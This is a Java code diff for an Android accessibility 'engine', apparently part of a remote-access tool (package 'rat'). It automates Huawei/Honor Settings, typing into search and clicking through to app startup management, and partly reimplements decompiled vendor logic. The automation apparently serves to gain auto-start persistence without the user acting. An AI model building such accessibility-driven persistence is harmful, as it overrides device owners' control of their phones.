@@ -1,9 +1,12 @@
 package com.vendor.rat.auto.engine.vendor;
 
+import android.os.Bundle;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.vendor.rat.auto.condition.CombineFilter;
+import com.vendor.rat.auto.condition.StringCondition;
 import com.vendor.rat.auto.engine.AutoEngine;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.auto.filter.NodeFilter;
@@ -178,12 +181,14 @@ public class HuaweiEngine extends AutoEngine {
                 stateQueue.remove(ST_DIALOG);
                 if (!stateQueue.contains(ST_HW_SETTINGS)) {
                     stateQueue.add(ST_HW_SETTINGS);
-                    // case 0: handleHwSettings
+                    // case 0: handleHwSettings — 搜索直达，优先级最高
                     scheduler.execute(new Runnable() {
                         @Override
                         public void run() { handleHwSettings(); }
                     });
                 }
+                // 搜索方式已提交，跳过 i0() 导航避免并发冲突
+                return;
             }
             if (i0()) {
                 stateQueue.remove(ST_HW_SETTINGS);
@@ -620,139 +625,276 @@ public class HuaweiEngine extends AutoEngine {
     // ============ 华为设置 / 应用和服务 ============
 
     /**
-     * case 0: handleHwSettings — 在华为主设置页面点击"应用和通知"
-     * vendor 真机日志:
-     *   03:59:47.836  keepAliveInHwSettings 窗口匹配
-     *   03:59:49.841  active root complete
-     *   03:59:49.860  查找华为系统设置滚动视图成功
-     *   03:59:49.969  已点击进入应用和服务栏目
+     * case 0: handleHwSettings — 在华为设置页面通过搜索直达"应用启动管理"
      *
-     * vendor 逻辑 (o/m.java case 0):
-     *   1. G() — 激活根节点 (带重试)
-     *   2. Q() — 获取滚动视图
-     *   3. 查找"应用和通知"文本节点
-     *   4. 点击该节点
+     * 优化策略: 直接在设置搜索框输入"应用启动管理"，点击搜索结果
+     * 跳过原来 设置→应用和服务/应用→启动管理 的多步导航
+     * 避免不同 EMUI 版本文本差异 (应用和通知/应用和服务/应用) 导致失败
      */
     private void handleHwSettings() {
+        searchAndEnterStartupManagement(ST_HW_SETTINGS);
+    }
+
+    /**
+     * 在设置搜索框中输入关键词并点击第一个搜索结果
+     *
+     * 注意: 华为设置搜索页有两种 TextView:
+     *   - 搜索历史: id=com.android.settings:id/flow_textview (点击只填入搜索框)
+     *   - 搜索结果: id=com.android.settings:id/title (点击进入对应页面)
+     * 必须点击 title 才能跳转
+     */
+    private boolean searchAndClickInSettings(String keyword) {
         try {
+            UiNode root = getRootNode();
+            if (root == null) return false;
+
+            // 查找搜索框
+            UiNode searchBox = root.findOneByCombine(
+                    StringCondition.viewId("android:id/search_src_text"));
+            if (searchBox == null) {
+                searchBox = root.findOneByClassName("android.widget.EditText");
+            }
+            if (searchBox == null) {
+                searchBox = root.findOneByClassName("android.widget.AutoCompleteTextView");
+            }
+            if (searchBox == null) {
+                log("设置搜索框未找到");
+                return false;
+            }
+
+            // 点击搜索框激活
+            searchBox.click();
             T0(3);
-            log("keepAliveInHwSettings 窗口匹配 → handleHwSettings");
 
-            // vendor: G() — 激活根节点
+            // 输入关键词
+            Bundle args = new Bundle();
+            args.putCharSequence(
+                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                    keyword);
+            searchBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+            log("搜索框输入: " + keyword);
+            T0(10); // 等待搜索结果
+
+            // 刷新并查找搜索结果
             G();
-            log("active root complete");
+            root = getRootNode();
+            if (root == null) return false;
 
-            CombineFilter filter = buildTextViewFilter("HUA_WEI_APP_AND_NOTIFICATION_TEXT");
-            if (filter == null) {
-                logError("HUA_WEI_APP_AND_NOTIFICATION_TEXT 配置为空");
-                return;
+            // 优先: 通过 title ID 查找搜索结果 (不是搜索历史 flow_textview)
+            UiNode result = root.findOneByCombine(CombineFilter.and(
+                    StringCondition.viewId("com.android.settings:id/title"),
+                    StringCondition.textContains(keyword)));
+            if (result != null) {
+                result.click();
+                log("点击搜索结果 (title): " + keyword);
+                T0(5);
+                return true;
             }
 
-            // 带重试查找 — 如果在子页面则 BACK 退出
-            UiNode node = null;
-            for (int retry = 0; retry < 10; retry++) {
-                UiNode scrollView = Q();
-                UiNode searchRoot = scrollView != null ? scrollView : k();
-                if (searchRoot == null) {
-                    G();
+            // 次选: 查找 path 旁边的 title (有 path 说明是搜索结果而非历史)
+            UiNode pathNode = root.findOneByCombine(
+                    StringCondition.viewId("com.android.settings:id/path"));
+            if (pathNode != null) {
+                // path 的兄弟节点 title 就是搜索结果
+                UiNode parent = pathNode.getParent();
+                if (parent != null) {
+                    result = parent.findOneByCombine(CombineFilter.and(
+                            StringCondition.viewId("com.android.settings:id/title"),
+                            StringCondition.textContains(keyword)));
+                    if (result == null) {
+                        // 点击整个父容器
+                        parent.click();
+                        log("点击搜索结果 (parent): " + keyword);
+                        T0(5);
+                        return true;
+                    }
+                    result.click();
+                    log("点击搜索结果 (path sibling): " + keyword);
                     T0(5);
-                    continue;
+                    return true;
                 }
-
-                node = searchRoot.findOneByCombine(filter);
-                if (node != null) break;
-
-                if (scrollView != null) {
-                    node = scrollView.scrollForwardUntil(filter);
-                    if (node != null) break;
-                }
-
-                // 可能还在子页面 (如"已安装的服务")，BACK 退出到上级
-                if (retry < 3) {
-                    log("应用和通知未找到，BACK 退出子页面 (" + (retry + 1) + "/3)");
-                    performBack();
-                    T0(5);
-                } else {
-                    log("应用和通知未找到，重试 " + (retry + 1) + "/10");
-                    T0(5);
-                }
-                G();
             }
 
-            if (node != null) {
-                node.click();
-                log("已点击进入应用和服务栏目");
-            } else {
-                logError("应用和通知栏目未找到 (10次重试后)");
-            }
+            log("搜索结果中未找到: " + keyword);
+            performBack();
+            T0(3);
+            return false;
         } catch (Exception e) {
-            logError("handleHwSettings error", e);
+            logError("searchAndClickInSettings error", e);
+            return false;
         }
     }
 
     /**
-     * case 1: handleAppAndNotification — 在"应用和服务"页面点击"启动管理"
-     * vendor 真机日志:
-     *   03:59:50.111  keepAliveInAppAndNotification 窗口匹配
-     *   03:59:52.113  active root complete
-     *   03:59:52.118  应用和服务窗口滚动视图查找成功
-     *   03:59:52.132  应用启动管理栏目查找成功
-     *   03:59:52.151  点击应用启动管理栏目完成
-     *
-     * vendor 逻辑 (o/m.java case 1):
-     *   1. G() — 激活根节点
-     *   2. Q() — 获取滚动视图
-     *   3. 查找"启动管理"文本节点
-     *   4. 点击该节点 → 进入启动管理页面 → k0() 匹配
+     * 回退导航方式: 设置 → 应用/应用和服务 → 启动管理
+     * 作为搜索方式失败时的 fallback
      */
-    private void handleAppAndNotification() {
-        try {
-            T0(3);
-            log("keepAliveInAppAndNotification 窗口匹配 → handleAppAndNotification");
+    private void navigateToStartupManagement() {
+        CombineFilter filter = buildTextViewFilter("HUA_WEI_APP_AND_NOTIFICATION_TEXT");
 
-            // vendor: G() — 激活根节点
-            G();
-            log("active root complete");
+        // 首次打开设置主页
+        launchSettings(SETTINGS, HW_SETTINGS);
+        T0(10);
+        G();
 
-            // vendor: Q() — 获取滚动视图
+        UiNode node = null;
+        for (int retry = 0; retry < 5; retry++) {
+            if (retry > 0) { T0(5); G(); }
+
             UiNode scrollView = Q();
-            if (scrollView != null) {
-                log("应用和服务窗口滚动视图查找成功");
-            } else {
-                log("滚动视图未找到，使用根节点");
-            }
-
-            // vendor: 查找"启动管理"文本 — 不是点击应用名!
-            // vendor 使用 "应用启动管理" / "启动管理" 文本匹配
             UiNode searchRoot = scrollView != null ? scrollView : k();
-            if (searchRoot == null) {
-                logError("根节点为空");
-                return;
-            }
+            if (searchRoot == null) { G(); T0(5); continue; }
 
-            // 尝试多个候选文本
-            String[] startupTexts = {"应用启动管理", "启动管理", "Startup manager"};
-            UiNode node = null;
-            for (String text : startupTexts) {
-                node = searchRoot.findOneByTextContains(text);
-                if (node != null) break;
-                // 滚动查找
-                if (scrollView != null) {
-                    node = scrollView.scrollForwardUntil(CombineFilter.textView(text));
-                    if (node != null) break;
+            // 长文本 contains 匹配
+            if (filter != null) {
+                node = searchRoot.findOneByCombine(filter);
+                if (node == null && scrollView != null) {
+                    node = scrollView.scrollForwardUntil(filter);
+                    if (node == null) {
+                        // 可能在底部，向上滚动查找
+                        scrollView.scrollBackward();
+                        T0(3);
+                        scrollView.scrollBackward();
+                        T0(3);
+                        scrollView.scrollBackward();
+                        T0(3);
+                        node = scrollView.scrollForwardUntil(filter);
+                    }
                 }
             }
 
-            if (node != null) {
-                log("应用启动管理栏目查找成功");
-                node.click();
-                log("点击应用启动管理栏目完成");
-            } else {
-                logError("启动管理栏目未找到，移除状态允许重试");
-                stateQueue.remove(ST_APP_NOTIF);
+            // 短文本精确匹配
+            if (node == null) {
+                List<String> shortTexts = getConfigTexts("HUA_WEI_APP_SHORT_TEXT");
+                if (shortTexts != null) {
+                    for (String text : shortTexts) {
+                        CombineFilter exactFilter = CombineFilter.textViewExact(text);
+                        node = searchRoot.findOneByCombine(exactFilter);
+                        if (node != null) break;
+                        if (scrollView != null) {
+                            node = scrollView.scrollForwardUntil(exactFilter);
+                            if (node != null) break;
+                        }
+                    }
+                }
+            }
+
+            if (node != null) break;
+            log("导航方式：应用入口未找到，重试 " + (retry + 1) + "/5");
+            T0(5);
+            G();
+        }
+
+        if (node != null) {
+            node.click();
+            log("已点击进入应用栏目（导航方式）");
+        } else {
+            logError("应用栏目未找到（导航方式也失败）");
+        }
+    }
+
+    /**
+     * 轮询确认已进入启动管理页面
+     * 检查前台窗口包名是否为 systemmanager/hihonor.systemmanager
+     * 最多轮询 10 次，每次 400ms，总计 4 秒
+     */
+    private boolean waitForStartupManagementPage() {
+        for (int i = 0; i < 10; i++) {
+            T0(2);
+            UiNode root = getRootNode();
+            if (root != null) {
+                String pkg = root.getPackageName();
+                if (HUAWEI_SM.equals(pkg) || HONOR_SM.equals(pkg)) {
+                    log("已确认进入启动管理页面 (" + (i + 1) + "次检查)");
+                    return true;
+                }
+            }
+        }
+        // fallback: 即使包名不匹配也尝试继续（可能是不同版本的包名）
+        log("启动管理页面包名未匹配，当前: " + getActiveWindowPackage() + "，仍尝试继续");
+        return true;
+    }
+
+    /** 获取当前前台窗口包名 (通过 UI 树，比事件回调的 currentPackage 更准确) */
+    private String getActiveWindowPackage() {
+        try {
+            UiNode root = getRootNode();
+            if (root != null) {
+                return root.getPackageName();
             }
         } catch (Exception e) {
-            logError("handleAppAndNotification error", e);
+            logError("getActiveWindowPackage error", e);
+        }
+        return "";
+    }
+
+    /**
+     * case 1: handleAppAndNotification — 从"应用和服务"子页面搜索直达启动管理
+     */
+    private void handleAppAndNotification() {
+        searchAndEnterStartupManagement(ST_APP_NOTIF);
+    }
+
+    /**
+     * 统一的搜索直达启动管理流程
+     * handleHwSettings 和 handleAppAndNotification 共用
+     *
+     * 流程:
+     *   1. 打开设置主页 (确保有搜索框)
+     *   2. 搜索 "应用启动管理" → "启动管理"
+     *   3. fallback: 导航方式
+     *   4. 轮询确认进入启动管理页面
+     *   5. 执行 handleStartupControl
+     */
+    private void searchAndEnterStartupManagement(String fromState) {
+        try {
+            T0(3);
+            log(fromState + " → 搜索直达应用启动管理");
+
+            // 打开设置主页 — 子页面没有搜索框
+            launchSettings(SETTINGS, HW_SETTINGS);
+            T0(10);
+            G();
+
+            boolean entered = false;
+
+            // 搜索 "应用启动管理"
+            if (searchAndClickInSettings("应用启动管理")) {
+                log("搜索直达应用启动管理成功");
+                entered = true;
+            }
+
+            // fallback: 搜索 "启动管理"
+            if (!entered) {
+                log("搜索'应用启动管理'未果，尝试'启动管理'");
+                launchSettings(SETTINGS, HW_SETTINGS);
+                T0(10);
+                G();
+                if (searchAndClickInSettings("启动管理")) {
+                    log("搜索直达启动管理成功");
+                    entered = true;
+                }
+            }
+
+            // fallback: 导航方式
+            if (!entered) {
+                log("搜索方式失败，回退到导航方式");
+                navigateToStartupManagement();
+                entered = true;
+            }
+
+            // 轮询确认进入启动管理 + 执行操作
+            if (entered) {
+                if (!waitForStartupManagementPage()) {
+                    logError("未能进入启动管理页面");
+                    return;
+                }
+                stateQueue.remove(fromState);
+                stateQueue.add(ST_STARTUP);
+                handleStartupControl();
+            }
+        } catch (Exception e) {
+            logError("searchAndEnterStartupManagement error (" + fromState + ")", e);
         }
     }
 
